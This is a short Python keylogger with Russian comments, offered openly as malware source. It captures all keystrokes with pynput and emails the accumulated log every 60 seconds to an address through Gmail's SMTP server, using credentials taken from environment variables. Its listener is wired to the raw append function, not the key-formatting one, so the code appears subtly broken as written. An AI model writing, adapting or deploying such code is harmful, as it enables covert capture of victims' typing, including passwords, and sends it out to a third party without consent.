import os
import threading
import smtplib

import pynput.keyboard


class KeyLogger:

    def __init__(self, time_interval, email, password):
        self.log = "Кейлоггер был запущен"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        """ Добавление нажатий в переменную log """
        self.log += string

    def get_clicked_key(self, key):
        """ Кастомизация вывода и добавление нажатий в add_log """
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def send_keylogger(self):
        """ Отправка кейлоггера на почту """
        print("[+] Кейлоггер отправлен почту!")
        self.send_email(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.send_keylogger)
        timer.start()

    def send_email(self, email, password, message):
        """ Настройки для smtp почты """
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def run_script(self):
        """ Запуск кейлоггера """
        keyboard_listener = pynput.keyboard.Listener(on_press=self.append_to_log)

        with keyboard_listener:
            self.send_keylogger()
            keyboard_listener.join()


def main():
    email_address = os.getenv("email_address")
    email_passwd = os.getenv("email_passwd")

    set_interval = 60 # укажите время

    keylogger = KeyLogger(set_interval, email_address, email_passwd)
    keylogger.run_script()


if __name__ == "__main__":
    main()
